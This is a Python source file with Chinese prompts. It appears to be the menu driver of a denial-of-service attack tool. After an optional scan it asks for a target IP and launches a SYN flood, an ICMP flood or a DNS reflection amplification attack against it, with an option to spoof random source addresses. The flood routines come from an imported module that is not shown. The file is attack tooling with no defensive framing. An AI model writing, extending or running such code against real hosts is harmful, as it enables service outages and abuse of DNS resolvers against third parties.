from scapy_flood import *

from getip import input_ip

import scan


# 选项菜单
def menu(d_ip, option=None):
    print('**********菜单**********')
    option = input('syn flood(S)、icmp flood(I)或dns reflection(D)\n选择要进行的泛洪攻击方式：')

    if option in ['s', 'S', 'syn', 'SYN']:
        d_port = int(input('正在执行的是SYN FLOOD攻击\n输入要攻击的端口(1-65535)：'))
        # 判断输入的目的端口是否符合要求
        if isinstance(d_port, int) and d_port in range(1, 65535):
            option = int(input('是否随机源地址(1:是 0:否)？'))
            th(syn_flood, (d_ip, d_port, option))
        else:
            print('\033[91m选项错误，重新输入！\n\033[0m')
            menu(d_ip, 'S')

    elif option in ['i', 'I', 'icmp', 'ICMP']:
        option = input('正在执行的是ICMP FLOOD攻击\n是否随机源地址(1:是 0:否)？')
        th(icmp_flood, (d_ip, option))

    elif option in ['d', 'D', 'DNS']:
        d_port = int(input('正在执行的是DNS反射放大攻击\n输入要攻击的端口(1-65535)：'))
        if isinstance(d_port, int) and d_port in range(1, 65535):
            th(reflect_flood, (d_ip, d_port, option), True)
        else:
            print('\033[91m选项错误，重新输入！\n\033[0m')
            menu(d_ip, 'D')

    else:
        print('\033[91m选项错误，重新输入！\n\033[0m')
        menu(d_ip)


def main():
    if input('是否先进行扫描(y or n):') == 'y':
        # 调用scan文件的扫描函数
        scan.main()
        # 输入目的地址
        d_ip = input_ip()
        menu(d_ip)
    else:
        d_ip = input_ip()
        menu(d_ip)


if __name__ == '__main__':
    main()
